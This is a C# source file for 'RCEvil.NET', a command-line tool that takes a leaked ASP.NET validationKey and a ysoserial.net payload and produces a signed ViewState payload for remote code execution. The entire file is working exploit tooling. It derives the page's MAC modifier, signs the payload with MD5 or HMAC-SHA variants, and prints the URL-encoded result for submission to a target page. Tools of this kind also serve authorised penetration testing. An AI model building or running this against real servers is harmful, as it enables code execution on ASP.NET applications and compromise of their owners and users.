using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Web;
using NDesk.Options;

namespace RCEvil.NET
{
    class Program
    {
        static void Main(string[] args)
        {
            // The options code is taken directly from pwntester's project
            Console.WriteLine("\n-=[ ViewState Toolset ]=-");

            string url = "";
            string validationKey = "";
            string digestMethod = "";
            string payloadb64 = "";
            byte[] payload;
            Boolean show_help = false;

            OptionSet options = new OptionSet()
            {
                {"u|url=", "The URL of the ASPX page (Required)", v => url = v },
                {"v|validationKey=", "The validationKey from web.config (Required)", v => validationKey = v },
                {"m|validationMethod=", "The validation method used: MD5|SHA1|HMACSHA256/384/512 (Required)", v => digestMethod = v },
                {"p|payload=", "The base64 payload generated from ysoserial.net (Required)", v => payloadb64 = v },
                {"h|help", "Show the help message", v => show_help = v != null },
            };

            List<string> extra;
            try
            {
                extra = options.Parse(args);
            }
            catch (OptionException e)
            {
                Console.Write("ViewState Crypto Signing Tool: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try running with '--help' for more information.");
                System.Environment.Exit(-1);
            }

            if (show_help == false && (url == "" || validationKey == "" || digestMethod == ""))
            {
                Console.WriteLine("\n**Error: The command is missing required arguments\n");
                show_help = true;
            }

            // Show help if requested
            if (show_help)
            {
                Console.WriteLine("ViewState Payload Generator uses leaked keys to generate a RCE payload.\n");
                Console.WriteLine("Usage: RCEvil.net.exe [options]");
                Console.WriteLine("Options:");
                options.WriteOptionDescriptions(Console.Out);
                System.Environment.Exit(0);
            }
            
            // Convert the base64 encoded payload
            payload = Convert.FromBase64String(payloadb64);

            // Normalize a bit
            digestMethod = digestMethod.ToUpper();

            // Prepare values to be used in 'modifier'
            string type = url.TrimStart('/').Replace('/', '_').Split('.')[0].ToUpper() + "_ASPX";
            string dir = "/" + url.TrimStart('/').Split('/')[0].ToUpper();

            // Check if this file was directly in the web root and adjust accordingly
            if (url.Count(x => x == '/') < 2) dir = "/";

            // From this point forward, these values are only referenced in hex
            byte[] hexValidationKey = StringToByteArray(validationKey);
            byte[] modifier = GetModifier(type, dir);

            // Status update for the end user
            Console.WriteLine("\nURL: " + url);
            Console.WriteLine("Digest Algorithm: " + digestMethod);
            Console.WriteLine("ValidationKey: " + validationKey);
            Console.WriteLine("Modifier: " + ByteArrayToString(modifier));// Convert.ToBase64String(modifier));

            // MD5 has its own old school method
            if (digestMethod == "MD5")
            {
                payload = HashPayload(payload, modifier, hexValidationKey, digestMethod);
            }
            // Pretty much everything else is a straight-forward HMAC process
            else
            {
                payload = HmacPayload(payload, modifier, hexValidationKey, digestMethod);
            }

            // Viola
            string finalPayload = HttpUtility.UrlEncode(Convert.ToBase64String(payload));

            // Finally, output to the console
            Console.WriteLine("\n-=[ Final Payload ]=-\n");
            Console.WriteLine(finalPayload);
    }

    // Convert a byte to ascii hex
    public static string ByteArrayToString(byte[] data)
    {
        StringBuilder retValue = new StringBuilder(data.Length * 2);
        foreach (byte b in data)
            retValue.AppendFormat("{0:x2}", b);
        return retValue.ToString();
    }

    // The conversion code is taken directly from pwntester
    public static byte[] StringToByteArray(string hex)
    {
        return Enumerable.Range(0, hex.Length)
                         .Where(x => x % 2 == 0)
                         .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                         .ToArray();
    }

    // Centralized method for the HMAC algorithms
    public static KeyedHashAlgorithm GetHMACAlgorithm(string digestMethod, byte[] validationKey)
    {
        switch (digestMethod)
        {
            case "SHA1":
                return new HMACSHA1(validationKey);
            case "HMACSHA256":
                return new HMACSHA256(validationKey);
            case "HMACSHA384":
                return new HMACSHA384(validationKey);
            case "HMACSHA512":
                return new HMACSHA512(validationKey);
            default:
                return new HMACSHA256(validationKey);
        }
    }

    // Taken directly from the .NET code
    public static byte[] GetModifier(string type, string dir)
    {
        // Prepare _macKeyBytes
        int modType = StringComparer.InvariantCultureIgnoreCase.GetHashCode(type);
        int modDir = StringComparer.InvariantCultureIgnoreCase.GetHashCode(dir);
        uint modifier = (uint)(modType + modDir);
        byte[] _modifier = new byte[4];
        _modifier[0] = (byte)modifier;
        _modifier[1] = (byte)(modifier >> 8);
        _modifier[2] = (byte)(modifier >> 16);
        _modifier[3] = (byte)(modifier >> 24);

        return _modifier;
    }

    // Turns out only MD5 uses this method, and it's kinda bad even beyond that
    public static byte[] HashPayload(byte[] payload, byte[] modifier, byte[] _vKey, string digestMethod)
    {
        // Create a buffer to hold the payload + modifier + validation key
        byte[] _hashme = new byte[payload.Length + modifier.Length + _vKey.Length];

        // Copy payload into _hashme
        Buffer.BlockCopy(payload, 0, _hashme, 0, payload.Length);

        // Append modifier salt value to _hashme
        Buffer.BlockCopy(modifier, 0, _hashme, payload.Length, modifier.Length);

        // Append the validation key value to _hashme
        // Doesn't make sense that we start the offset at the payload length, but that's how .net has it
        Buffer.BlockCopy(_vKey, 0, _hashme, payload.Length, _vKey.Length);

        // Collect the hash value
        byte[] hash = null;
        if (digestMethod == "MD5")
        {
            MD5 md5Hasher = MD5.Create();
            hash = md5Hasher.ComputeHash(_hashme);
        }

        // Prepare our final, signed payload
        byte[] finalPayload = new byte[hash.Length + payload.Length];
        Buffer.BlockCopy(payload, 0, finalPayload, 0, payload.Length);
        Buffer.BlockCopy(hash, 0, finalPayload, payload.Length, hash.Length);

        return finalPayload;
    }

        // The non-crypto legacy code path in .NET that yields a wildly different procedure
        public static byte[] HmacPayload(byte[] payload, byte[] modifier, byte[] validationKey, string digestMethod)
        {
            // Time to start the HMAC work
            KeyedHashAlgorithm validationAlgorithm = GetHMACAlgorithm(digestMethod, validationKey);

            // Create a buffer to hold the payload + modifier
            byte[] _hashme = new byte[payload.Length + modifier.Length];

            // Copy payload into _hashme
            System.Buffer.BlockCopy(payload, 0, _hashme, 0, payload.Length);

            // Append _modifier salt value to _hashme
            System.Buffer.BlockCopy(modifier, 0, _hashme, payload.Length, modifier.Length);

            // Collect the hmac value from the salted
            byte[] hash = validationAlgorithm.ComputeHash(_hashme);

            // Prepare our final, signed payload
            byte[] finalPayload = new byte[hash.Length + payload.Length];
            System.Buffer.BlockCopy(payload, 0, finalPayload, 0, payload.Length);
            System.Buffer.BlockCopy(hash, 0, finalPayload, payload.Length, hash.Length);

            return finalPayload;
        }
    }
}